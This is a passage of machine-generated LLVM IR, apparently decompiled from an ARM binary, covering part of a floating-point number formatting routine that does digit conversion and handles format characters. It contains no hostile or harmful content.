  store i32 %v0_13fb8, i32* %r3.global-to-local, align 4
  store i32 %v0_13fb4, i32* @r0, align 4
  store i32 %v0_13fb8, i32* %r1.global-to-local, align 4
  %v7_13fd0 = call i32 @__aeabi_dcmpeq(i32 %v0_13fb4, i32 %v0_13fb8, i32 %v11_13fbc, i32 %v0_13fb8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_13fd0, i32* %r0.global-to-local, align 4
  %v2_13fd4 = icmp eq i32 %v7_13fd0, 0
  store i1 %v2_13fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fd4, label %dec_label_pc_14028, label %.thread9.dec_label_pc_13fdc_crit_edge

.thread9.dec_label_pc_13fdc_crit_edge:            ; preds = %.thread9
  %v3_13fdc.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %bb207, %.thread9.dec_label_pc_13fdc_crit_edge
  %v3_13fdc = phi i32 [ %v3_13fdc.pre, %.thread9.dec_label_pc_13fdc_crit_edge ], [ %arg4, %bb207 ]
  %v1_13f20.v0_13f0c5 = phi i32 [ 0, %.thread9.dec_label_pc_13fdc_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_13fdc, i32* %ip.global-to-local, align 4
  %v2_13fe4 = add i32 %v3_13fdc, 16
  %v3_13fe4 = inttoptr i32 %v2_13fe4 to i32*
  store i32 32, i32* %v3_13fe4, align 4
  %v0_13fec = load i32, i32* %sb.global-to-local, align 4
  %v7_13fec = icmp eq i32 %v0_13fec, 96
  store i1 %v7_13fec, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_13fec, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_13fdc
  %v5_14000 = or i32 %v1_13f20.v0_13f0c5, 4
  store i32 %v5_14000, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_13fdc, %bb210
  %v4_14004 = phi i32 [ %v5_14000, %bb210 ], [ 3, %dec_label_pc_13fdc ]
  %v4_14004.v1_13f20.v0_13f0c = select i1 %tmp274, i32 %v4_14004, i32 %v1_13f20.v0_13f0c5
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34080), i32* %r3.global-to-local, align 4
  %v2_14018 = add i32 %v4_14004.v1_13f20.v0_13f0c, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34080)
  store i32 %v2_14018, i32* %r2.global-to-local, align 4
  %v2_1401c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1401c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14544

dec_label_pc_14028:                               ; preds = %.thread9
  %v0_14028 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14028, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_14030 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14030, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_14038 = call i32 @__aeabi_dcmplt(i32 %v0_14030, i32 %v0_14028, i32 0, i32 1100470148)
  store i32 %v6_14038, i32* %r0.global-to-local, align 4
  %v2_1403c = icmp eq i32 %v6_14038, 0
  store i1 %v2_1403c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1403c, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_14028
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_14028, %bb211
  %v0_14044 = phi i32 [ 0, %dec_label_pc_14028 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34056), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34056), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_14078 = icmp eq i32 %v0_14044, 0
  br label %dec_label_pc_14068

dec_label_pc_14068:                               ; preds = %dec_label_pc_14100.dec_label_pc_14068_crit_edge, %bb212
  %v2_14070 = phi i32 [ add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34056), %bb212 ], [ %v2_14070.pre, %dec_label_pc_14100.dec_label_pc_14068_crit_edge ]
  %v0_1406c = phi i32 [ 9, %bb212 ], [ %v0_14100, %dec_label_pc_14100.dec_label_pc_14068_crit_edge ]
  %v2_140b0 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_14100.dec_label_pc_14068_crit_edge ]
  store i32 %v0_14044, i32* %r2.global-to-local, align 4
  %v1_1406c = add i32 %v0_1406c, -1
  store i32 %v1_1406c, i32* %sl.global-to-local, align 4
  store i32 %v2_14070, i32* @lr, align 4
  %v3_14074 = mul i32 %v1_1406c, 8
  store i32 %v3_14074, i32* %r3.global-to-local, align 4
  store i1 %v2_14078, i1* %cpsr_z.global-to-local, align 1
  %v0_1407c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1407c, i32* %r0.global-to-local, align 4
  %v0_14080 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14080, i32* %r1.global-to-local, align 4
  %v2_14084 = add i32 %v3_14074, %v2_14070
  store i32 %v2_14084, i32* %ip.global-to-local, align 4
  %v1_140c0 = inttoptr i32 %v2_14084 to i32*
  %v2_140c0 = load i32, i32* %v1_140c0, align 4
  %v3_140c0 = sext i32 %v2_140c0 to i64
  %v1_140c4 = sext i32 %v0_1407c to i64
  %v2_140c4 = bitcast i64 %v1_140c4 to double
  br i1 %v2_14078, label %dec_label_pc_140c0, label %dec_label_pc_1408c

dec_label_pc_1408c:                               ; preds = %dec_label_pc_14068
  %v8_14090 = bitcast i64 %v3_140c0 to double
  %v9_14090 = fmul double %v2_140c4, %v8_14090
  %v10_14090 = fptrunc double %v9_14090 to float
  %v11_14090 = bitcast float %v10_14090 to i32
  store i32 %v11_14090, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_14090, i32* %r7.global-to-local, align 4
  store i32 %v0_14080, i32* %r8.global-to-local, align 4
  %v4_140a4 = call i32 @__aeabi_dcmplt(i32 %v11_14090, i32 %v0_14080, i32 0, i32 1104006501)
  store i32 %v4_140a4, i32* %r0.global-to-local, align 4
  %v2_140a8 = icmp eq i32 %v4_140a4, 0
  store i1 %v2_140a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140a8, label %dec_label_pc_14100, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1408c
  %v1_140b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_140b0 = sub i32 %v2_140b0, %v1_140b0
  store i32 %v3_140b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140f8

dec_label_pc_140c0:                               ; preds = %dec_label_pc_14068
  store i32 %v0_14080, i32* @r1, align 4
  %v8_140cc = bitcast i64 %v3_140c0 to double
  %v9_140cc = fdiv double %v2_140c4, %v8_140cc
  %v10_140cc = fptrunc double %v9_140cc to float
  %v11_140cc = bitcast float %v10_140cc to i32
  store i32 %v11_140cc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_140cc, i32* %r7.global-to-local, align 4
  store i32 %v0_14080, i32* %r8.global-to-local, align 4
  %v4_140e0 = call i32 @__aeabi_dcmpge(i32 %v11_140cc, i32 %v0_14080, i32 0, i32 1100470148)
  store i32 %v4_140e0, i32* %r0.global-to-local, align 4
  %v2_140e4 = icmp eq i32 %v4_140e0, 0
  store i1 %v2_140e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140e4, label %dec_label_pc_14100, label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140c0
  %v1_140f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_140f0 = add i32 %v1_140f0, %v2_140b0
  store i32 %v2_140f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_140f8

dec_label_pc_140f8:                               ; preds = %.thread10, %dec_label_pc_140ec
  %stack_var_-192.2 = phi i32 [ %v2_140f0, %dec_label_pc_140ec ], [ %v3_140b0, %.thread10 ]
  %v0_140f8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_140f8, i32* %r5.global-to-local, align 4
  %v0_140fc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_140fc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %dec_label_pc_1408c, %dec_label_pc_140c0, %dec_label_pc_140f8
  %stack_var_-192.3 = phi i32 [ %v2_140b0, %dec_label_pc_140c0 ], [ %stack_var_-192.2, %dec_label_pc_140f8 ], [ %v2_140b0, %dec_label_pc_1408c ]
  %v0_14100 = load i32, i32* %sl.global-to-local, align 4
  %v2_14100 = icmp eq i32 %v0_14100, 0
  store i1 %v2_14100, i1* %cpsr_z.global-to-local, align 1
  %v0_14104 = load i32, i32* %r4.global-to-local, align 4
  %v3_14104 = sdiv i32 %v0_14104, 2
  store i32 %v3_14104, i32* %r4.global-to-local, align 4
  br i1 %v2_14100, label %dec_label_pc_1410c, label %dec_label_pc_14100.dec_label_pc_14068_crit_edge

dec_label_pc_14100.dec_label_pc_14068_crit_edge:  ; preds = %dec_label_pc_14100
  %v2_14070.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_14068

dec_label_pc_1410c:                               ; preds = %dec_label_pc_14100
  %v0_1410c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1410c, i32* @r0, align 4
  %v0_14110 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14110, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_1411c = call i32 @__aeabi_dcmpge(i32 %v0_1410c, i32 %v0_14110, i32 0, i32 1104006501)
  store i32 %v6_1411c, i32* %r0.global-to-local, align 4
  %v2_14120 = icmp eq i32 %v6_1411c, 0
  store i1 %v2_14120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14120, label %dec_label_pc_14150, label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_1410c
  %v0_14128 = load i32, i32* %r5.global-to-local, align 4
  %v1_14128 = sext i32 %v0_14128 to i64
  %v2_14128 = bitcast i64 %v1_14128 to double
  %v0_1412c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1412c, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_14138 = fdiv double %v2_14128, 0.000000e+00
  %v10_14138 = fptrunc double %v9_14138 to float
  %v11_14138 = bitcast float %v10_14138 to i32
  store i32 %v11_14138, i32* %r0.global-to-local, align 4
  store i32 %v11_14138, i32* %r5.global-to-local, align 4
  %v1_14148 = add i32 %stack_var_-192.3, 1
  store i32 %v1_14148, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14150

dec_label_pc_14150:                               ; preds = %dec_label_pc_14128, %bb208, %dec_label_pc_1410c, %dec_label_pc_13f70
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_1410c ], [ -1, %dec_label_pc_13f70 ], [ -1, %bb208 ], [ %v1_14148, %dec_label_pc_14128 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_14154 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_14154, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14158

dec_label_pc_14158:                               ; preds = %dec_label_pc_141d0, %dec_label_pc_14150
  %v0_14158 = load i32, i32* %r6.global-to-local, align 4
  %v0_1415c = load i32, i32* %r5.global-to-local, align 4
  %v1_14160 = sext i32 %v0_1415c to i64
  %v2_14160 = bitcast i64 %v1_14160 to double
  %v3_14160 = fptoui double %v2_14160 to i32
  store i32 %v3_14160, i32* %r8.global-to-local, align 4
  store i32 %v3_14160, i32* %r2.global-to-local, align 4
  store i32 %v0_14158, i32* %r3.global-to-local, align 4
  store i32 %v0_1415c, i32* @r0, align 4
  store i32 %v0_14158, i32* %r1.global-to-local, align 4
  %v6_1417c = call i32 @__aeabi_dsub(i32 %v0_1415c, i32 %v0_14158, i32 %v3_14160, i32 %v0_14158)
  %v7_1417c = sext i32 %v6_1417c to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_14188 = bitcast i64 %v7_1417c to double
  %v9_14188 = fmul double %v3_14188, 0.000000e+00
  %v10_14188 = fptrunc double %v9_14188 to float
  %v11_14188 = bitcast float %v10_14188 to i32
  store i32 %v11_14188, i32* %r0.global-to-local, align 4
  %v0_1418c = load i32, i32* %sl.global-to-local, align 4
  %v1_1418c = add i32 %v0_1418c, 9
  store i32 %v1_1418c, i32* %sl.global-to-local, align 4
  store i32 %v11_14188, i32* %r5.global-to-local, align 4
  store i32 %v0_14158, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1419c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1419c

dec_label_pc_1419c:                               ; preds = %dec_label_pc_1419c.dec_label_pc_1419c_crit_edge, %dec_label_pc_14158
  %v1_141b0 = phi i32 [ %v1_141b0.pre, %dec_label_pc_1419c.dec_label_pc_1419c_crit_edge ], [ %v1_1418c, %dec_label_pc_14158 ]
  %v0_141a8 = phi i32 [ %v0_141c4, %dec_label_pc_1419c.dec_label_pc_1419c_crit_edge ], [ 0, %dec_label_pc_14158 ]
  %v0_141b4 = phi i32 [ %v2_141c0, %dec_label_pc_1419c.dec_label_pc_1419c_crit_edge ], [ %v0_1419c.pre, %dec_label_pc_14158 ]
  %v3_141a4 = urem i32 %v0_141b4, 10
  %v1_141a8 = add i32 %v0_141a8, 1
  store i32 %v1_141a8, i32* %r7.global-to-local, align 4
  %v1_141ac = or i32 %v3_141a4, 48
  store i32 %v1_141ac, i32* %r2.global-to-local, align 4
  %v2_141b0 = sub i32 %v1_141b0, %v1_141a8
  store i32 %v2_141b0, i32* %r3.global-to-local, align 4
  store i32 %v0_141b4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_141bc = trunc i32 %v1_141ac to i8
  %v3_141bc = inttoptr i32 %v2_141b0 to i8*
  store i8 %v1_141bc, i8* %v3_141bc, align 1
  %v0_141c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_141c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_141c0 = udiv i32 %v0_141c0, %v1_141c0
  store i32 %v2_141c0, i32* %r0.global-to-local, align 4
  %v0_141c4 = load i32, i32* %r7.global-to-local, align 4
  %v7_141c4 = icmp eq i32 %v0_141c4, 8
  store i1 %v7_141c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_141c0, i32* %r8.global-to-local, align 4
  %v7_141cc = icmp slt i32 %v0_141c4, 9
  br i1 %v7_141cc, label %dec_label_pc_1419c.dec_label_pc_1419c_crit_edge, label %dec_label_pc_141d0

dec_label_pc_1419c.dec_label_pc_1419c_crit_edge:  ; preds = %dec_label_pc_1419c
  %v1_141b0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1419c

dec_label_pc_141d0:                               ; preds = %dec_label_pc_1419c
  %v0_141d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_141d0 = add i32 %v0_141d0, 1
  store i32 %v1_141d0, i32* %r4.global-to-local, align 4
  %v7_141d4 = icmp eq i32 %v0_141d0, 0
  store i1 %v7_141d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_141d4, label %dec_label_pc_14158, label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141d0
  %v0_141dc = load i32, i32* %sb.global-to-local, align 4
  %v7_141dc = icmp eq i32 %v0_141dc, 96
  store i1 %v7_141dc, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_141dc, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_141dc
  %v5_141ec = add i32 %v0_141dc, 32
  store i32 %v5_141ec, i32* %r3.global-to-local, align 4
  %v5_141f0 = urem i32 %v5_141ec, 256
  store i32 %v5_141f0, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_141dc
  %v4_141e8.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_141e8.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_141e8126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_14210 = phi i32 [ %v0_141dc, %thread-pre-split ], [ %v5_141f0, %bb213 ]
  %v7_141f4 = icmp eq i32 %v0_14210, 103
  %. = zext i1 %v7_141f4 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_14200 = load i32, i32* %fp.global-to-local, align 4
  %v2_14200 = icmp eq i32 %v0_14200, 0
  store i1 %v2_14200, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_14200, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_14208 = icmp eq i1 %v7_141f4, false
  store i1 %v2_14208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14208, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_1420c = add i32 %v0_14200, -1
  store i32 %v2_1420c, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_14220 = phi i32 [ %v0_14200, %.thread16 ], [ %v0_14200, %bb218 ], [ %v2_1420c, %bb219 ]
  %v7_14210 = icmp eq i32 %v0_14210, 102
  store i1 %v7_14210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14210, label %dec_label_pc_1421c, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_14220, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14244

dec_label_pc_1421c:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_14220 = add i32 %v0_14220, %stack_var_-192.4
  store i32 %v2_14220, i32* %ip.global-to-local, align 4
  %v8_14224 = icmp eq i32 %v2_14220, -1
  store i1 %v8_14224, i1* %cpsr_z.global-to-local, align 1
  %v6_14228 = icmp slt i32 %v2_14220, -1
  br i1 %v6_14228, label %dec_label_pc_1422c, label %dec_label_pc_14244

dec_label_pc_1422c:                               ; preds = %dec_label_pc_1421c
  %v2_1422c = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1422c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_14238 = bitcast i32* %stack_var_-83 to i8*
  %v3_14238 = call i32 @__GI_memset(i8* %v2_14238, i32 48)
  store i32 %v3_14238, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %bb221, %dec_label_pc_1421c, %dec_label_pc_1422c
  %v1_1428892 = phi i32 [ %v3_14238, %dec_label_pc_1422c ], [ %v2_141c0, %dec_label_pc_1421c ], [ %v2_141c0, %bb221 ]
  %v1_1426c = phi i32 [ -1, %dec_label_pc_1422c ], [ %v2_14220, %dec_label_pc_1421c ], [ %v0_14220, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_1422c ], [ %stack_var_-192.4, %dec_label_pc_1421c ], [ %stack_var_-192.4, %bb221 ]
  %v1_14248 = add i32 %v1_1426c, -16
  %v3_14248 = sub i32 15, %v1_1426c
  %v4_14248 = and i32 %v3_14248, %v1_1426c
  %v5_14248 = icmp slt i32 %v4_14248, 0
  %v6_14248 = icmp slt i32 %v1_14248, 0
  %v7_14248 = icmp eq i32 %v1_1426c, 16
  store i1 %v7_14248, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_14254 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_14254, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_1425c = xor i1 %v6_14248, %v5_14248
  %v4_1425c = or i1 %v7_14248, %v3_1425c
  br i1 %v4_1425c, label %dec_label_pc_14268, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_14244
  %v7_1425c137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_1425c137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_14268:                               ; preds = %dec_label_pc_14244
  %v2_14268 = ptrtoint i32* %stack_var_-82 to i32
  %v2_1426c = add i32 %v1_1426c, %v2_14268
  store i32 %v2_1426c, i32* %r3.global-to-local, align 4
  %v1_14270 = add i32 %v2_1426c, 2
  %v2_14270 = inttoptr i32 %v1_14270 to i8*
  %v3_14270 = load i8, i8* %v2_14270, align 1
  %v4_14270 = zext i8 %v3_14270 to i32
  store i32 %v4_14270, i32* %r2.global-to-local, align 4
  store i32 %v1_14270, i32* %r1.global-to-local, align 4
  %v2_14278 = icmp ugt i8 %v3_14270, 51
  %v7_14278 = icmp eq i8 %v3_14270, 52
  store i1 %v7_14278, i1* %cpsr_z.global-to-local, align 1
  %v2_1427c = xor i1 %v2_14278, true
  %v3_1427c = or i1 %v7_14278, %v2_1427c
  br i1 %v3_1427c, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_14268
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_14268, %bb222
  %v1_1428890 = phi i32 [ %v1_1428892, %dec_label_pc_14268 ], [ 0, %bb222 ]
  %v2_14280 = xor i1 %v7_14278, true
  %v3_14280 = and i1 %v2_14278, %v2_14280
  br i1 %v3_14280, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_14284 = phi i32 [ %v0_14284.pre, %._crit_edge87 ], [ %v7_1425c137141, %.thread140 ], [ %v1_14270, %bb223 ], [ %v1_14270, %bb224 ]
  %v1_14288 = phi i32 [ %v1_14288.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1428890, %bb223 ], [ 1, %bb224 ]
  %v1_14284 = add i32 %v0_14284, -1
  %v2_14284 = inttoptr i32 %v1_14284 to i8*
  %v3_14284 = load i8, i8* %v2_14284, align 1
  %v4_14284 = zext i8 %v3_14284 to i32
  store i32 %v1_14284, i32* %r1.global-to-local, align 4
  %v2_14288 = add i32 %v4_14284, %v1_14288
  %v1_1428c = urem i32 %v2_14288, 256
  store i32 %v1_1428c, i32* %r3.global-to-local, align 4
  %v2_14290 = icmp ugt i32 %v1_1428c, 56
  %v7_14290 = icmp eq i32 %v1_1428c, 57
  store i1 %v7_14290, i1* %cpsr_z.global-to-local, align 1
  %v2_14294 = xor i1 %v2_14290, true
  %v3_14294 = or i1 %v7_14290, %v2_14294
  br i1 %v3_14294, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_14298 = xor i1 %v7_14290, true
  %v3_14298 = and i1 %v2_14290, %v2_14298
  br i1 %v3_14298, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_142a0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_142a0 = phi i32 [ %v1_142a0.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_1429c = icmp eq i32 %v1_1428c, 48
  store i1 %v7_1429c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1429c, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_142a0 = or i32 %v1_142a0, 1
  store i32 %v2_142a0, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_142a4 = phi i32 [ 1, %bb229 ], [ %v1_142a0, %bb228 ]
  %v2_142a4 = icmp eq i32 %v0_142a4, 0
  store i1 %v2_142a4, i1* %cpsr_z.global-to-local, align 1
  %v1_142a8 = trunc i32 %v2_14288 to i8
  store i8 %v1_142a8, i8* %v2_14284, align 1
  %v0_142ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_142ac, label %dec_label_pc_142b0, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_14288.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_14284.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_142b0:                               ; preds = %._crit_edge93
  store i32 %v2_14254, i32* %r2.global-to-local, align 4
  %v2_142b4 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_142b4, i32* %r3.global-to-local, align 4
  %v0_142b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_142b8 = icmp uge i32 %v0_142b8, %v2_142b4
  %v9_142b8 = icmp eq i32 %v0_142b8, %v2_142b4
  store i1 %v9_142b8, i1* %cpsr_z.global-to-local, align 1
  %v2_142bc = xor i1 %v3_142b8, true
  %v3_142bc = or i1 %v9_142b8, %v2_142bc
  br i1 %v3_142bc, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_142b0
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_142b4, i32* %r2.global-to-local, align 4
  store i32 %v2_142b4, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_142b0, %bb230
  %v2_142dc = phi i32 [ %v2_142b4, %bb230 ], [ %v0_142b8, %dec_label_pc_142b0 ]
  %v4_142d0144 = phi i32 [ %v2_142b4, %bb230 ], [ %v2_14254, %dec_label_pc_142b0 ]
  %v2_142c8 = xor i1 %v9_142b8, true
  %v3_142c8 = and i1 %v3_142b8, %v2_142c8
  br i1 %v3_142c8, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_142bc, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_142cc = load i32, i32* @lr, align 4
  %v5_142cc = add i32 %v4_142cc, 1
  store i32 %v5_142cc, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_142c8, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_142d0 = add i32 %v4_142d0144, 2
  store i32 %v5_142d0, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_142d8 = load i32, i32* %sb.global-to-local, align 4
  %v7_142d8 = icmp eq i32 %v0_142d8, 103
  store i1 %v7_142d8, i1* %cpsr_z.global-to-local, align 1
  %v3_142dc = add i32 %v2_142dc, 1
  %v4_142dc = inttoptr i32 %v3_142dc to i8*
  store i8 0, i8* %v4_142dc, align 1
  %v0_142e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_142e0 = add i32 %v0_142e0, 1
  store i32 %v1_142e0, i32* %lr.global-to-local, align 4
  %v0_142e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_142e4, label %dec_label_pc_142e8, label %dec_label_pc_14310

dec_label_pc_142e8:                               ; preds = %bb236
  %v0_142e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_142e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_142e8 = sub i32 %v0_142e8, %v1_142e8
  %v4_142e8 = xor i32 %v1_142e8, %v0_142e8
  %v5_142e8 = xor i32 %v2_142e8, %v0_142e8
  %v6_142e8 = and i32 %v5_142e8, %v4_142e8
  %v7_142e8 = icmp slt i32 %v6_142e8, 0
  %v8_142e8 = icmp slt i32 %v2_142e8, 0
  %v9_142e8 = icmp eq i32 %v0_142e8, %v1_142e8
  %v3_142ec = xor i1 %v8_142e8, %v7_142e8
  %v4_142ec = or i1 %v9_142e8, %v3_142ec
  %.258 = zext i1 %v4_142ec to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_142f4 = add i32 %v0_142e8, 4
  %v3_142f4 = sub i32 0, %v0_142e8
  %v4_142f4 = and i32 %v1_142f4, %v3_142f4
  %v5_142f4 = icmp slt i32 %v4_142f4, 0
  %v6_142f4 = icmp slt i32 %v1_142f4, 0
  %v7_142f4 = icmp eq i32 %v1_142f4, 0
  store i1 %v7_142f4, i1* %cpsr_z.global-to-local, align 1
  %v2_142f8 = xor i1 %v6_142f4, %v5_142f4
  br i1 %v2_142f8, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_142e8
  store i32 0, i32* %r3.global-to-local, align 4
